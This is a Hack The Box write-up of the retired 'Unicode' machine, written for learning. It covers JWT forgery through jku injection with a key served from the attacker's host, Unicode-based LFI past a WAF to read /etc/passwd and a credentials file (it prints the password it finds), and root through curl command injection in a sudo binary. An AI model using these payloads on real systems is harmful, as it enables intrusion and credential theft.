---
layout: writeup
name: "Unicode"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
permalink: /writeups/retired/unicode/
os: "Hack The Box"
date: 2026-02-25
pwned: true
---
# 🧪 Unicode – HTB Writeup

**Platform:** Hack The Box  
**Difficulty:** Medium  
**OS:** Linux  
**Release Date:** 27 Nov 2021  
**Author:** webspl01t3r
**Writeup by:** inkedQT  
**User flag:** `e0a0c27b634bd51e0aee4cb0********`  
**Root flag:** `ca86fe9edd53a27e61f96099********`

---

## 🧭 Overview

Unicode is a Linux machine that involves JWT manipulation via JWKS injection, filtered LFI bypass using Unicode tricks, and a Python binary reverse-engineered for privilege escalation. Key elements include JWT key confusion, a HostSplit-based Unicode LFI bypass, and exploiting a filtered `curl` command in a custom executable.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- --min-rate=1000 -T4 10.10.11.126
nmap -p22,80 -sV 10.10.11.126
```

Open Ports:
- `22/tcp` – OpenSSH
- `80/tcp` – Nginx

### 🕵️‍♂️ Web Enum

- Website presents a **Hackmedia** portal.
- Registration/login available.
- File upload only accepts PDFs.
- JWT-based cookie is assigned after login.

Cookie Header:
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/static/jwks.json"
}
```

---

## 🧨 Exploitation

### 🔐 JWT JWKS Injection

- A `jku` header points to a JWKS file.
- There's an open `/redirect?url=` endpoint → exploitable for **key confusion**.
- Host a malicious JWKS file:

```bash
cd jwt_tool
python3 -m http.server 80
```

- Forge a token using:
```bash
python3 jwt_tool.py <JWT> \
  -X s \
  -ju 'http://hackmedia.htb/static/../redirect?url=10.10.14.18/jwttool_custom_jwks.json' \
  -I -pc user -pv admin
```

- Replace the `auth` cookie → gain **admin access**.

---

### 🗂️ Unicode LFI via HostSplit

- Admin dashboard loads PDF reports via:
  ```
  /display/?page=monthly.pdf
  ```

- Standard LFI blocked by WAF.
- Unicode trick: use **"Two Dot Leader"** (‥ – `U+2025`) instead of `..`

```bash
http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/etc/passwd
```

- Used this to find `db.yaml`:

```bash
http://hackmedia.htb/display/?page=‥/‥/‥/home/code/coder/db.yaml
```

- Credentials inside:

```yaml
mysql_user: code
mysql_password: B3stC0d3r2021@@!
```

### 🔐 SSH Access

```bash
ssh code@hackmedia.htb
# Shell as code
```

**User flag:** `e0a0c27b634bd51e0aee4cb0********`

---

## ⬆️ Privilege Escalation

### 🔍 Sudo Check

```bash
sudo -l
# /usr/bin/treport (no password)
```

### 🔎 Reverse Engineering treport

- Binary is PyInstaller-packed.
- Extract with `pyinstxtractor.py`
- Decompile `.pyc` with `uncompyle6`

Found vulnerable code:
```python
cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
```

- Unsafe: `curl` injection is possible
- `{}`, `,` are allowed → bypass with `${IFS}` or similar

### 💥 Exploit: Inject SSH Key

```bash
# Host malicious public key
cp ~/.ssh/id_rsa.pub .
python3 -m http.server 80
```

Then on box:

```bash
sudo /usr/bin/treport
# Inject payload with URL to SSH key
```

- SSH as root

**Root flag:** `ca86fe9edd53a27e61f96099********`

---

## 📚 Lessons Learned

- 🧬 **JWT JWKS injection** via `jku` and open redirect
- 🧙 **Unicode-based LFI bypass** using HostSplit
- 🐍 **Reverse engineering PyInstaller binaries**
- 🔐 SSH key injection through filtered command injection

---

## 📸 Proof

![proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/unicode.png)
